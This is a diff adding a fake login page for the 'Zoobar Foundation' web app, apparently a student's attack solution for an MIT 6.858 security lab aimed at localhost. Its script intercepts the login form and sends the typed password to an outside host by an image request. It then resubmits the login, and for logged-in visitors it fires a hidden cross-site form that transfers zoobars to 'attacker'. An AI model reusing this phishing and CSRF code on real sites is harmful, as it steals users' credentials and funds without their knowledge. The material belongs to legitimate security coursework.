@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+        <title>
+          Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>
+        
+        
+        
+        
+        
+        
+        
+      <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Objective
+                      Advocacy</a></h1>
+      <h2>Supporting the meritorious
+          advocates of the next generation</h2>
+      
+<div id="login" class="centerpiece">
+
+
+<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" id="attackf">
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type="text" name="login_username" size="20"
+  autocomplete="no" value=""></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
+  <input id="submit_button" type="submit" name="submit_login" value="Log in">
+  <input type="submit" name="submit_registration" value="Register"></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/users">
+</form>
+
+<iframe id="attackf" name="attackf" style="display:none" srcdoc=""></iframe>
+
+<div style="display:none">
+<form method='POST' name='transferform' id='transferform' action='http://localhost:8080/zoobar/index.cgi/transfer' target="attackf">
+<p>Send <input name='zoobars_orig' type='text' value='' size=5> zoobars</p>
+<p>to <input name=recipientold type=text value='' size=10></p>
+<input name='zoobars' type='text' value='10' size=5 style='display:none'>
+<input name=recipient type=text value='attacker' size=10 style='display:none'>
+<input type='submit' name='submission' value='Send'>
+</form>
+</div>
+</div>
+<script>document.loginform.login_username.focus();</script>
+
+<div style="display:none", id="myZoobars"></div>
+<script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+
+<script>
+function chwindow() {
+  // alert("changing url");
+  window.parent.location.href="http://css.csail.mit.edu/6.858/2015/";
+}
+
+function resubmit() {
+  // alert("in resubmit");
+  document.getElementById("attackf").removeEventListener("submit", ldready);
+  document.getElementById("submit_button").click();
+}
+
+function ldready(event) {
+    event.preventDefault();
+    var un = document.getElementsByName('login_username')[0].value;
+    var pw = document.getElementsByName('login_password')[0].value;
+    // alert("un: " + un + " pw: " + pw);
+
+    (new Image()).src='http://css.csail.mit.edu/6.858/2015/labs/sendmail.php?' + 'to=jains@mit.edu' + '&payload=' + pw + '&random=' + Math.random();
+    setTimeout(resubmit, 500);
+}
+// var client = new XMLHttpRequest();
+// client.open('GET', '/zoobar/index.cgi/zoobarjs');
+// client.onreadystatechange = function() {
+var div_value = document.getElementById("myZoobars").innerHTML;
+if(div_value) {
+  // execute theft from exercise 8
+  // alert(client.responseText);
+  // alert("LOGGED IN");
+  document.getElementById('transferform').submit();
+  setTimeout(chwindow, 1000);
+} 
+else {
+  // not logged in, steal credentials on form submit
+  // alert("NOT LOGGED IN");
+  document.getElementById("attackf").addEventListener("submit", ldready, false);
+  }
+</script>
+
+</div>
+<div class="footer warning">
+
+
+</body>
+</html>
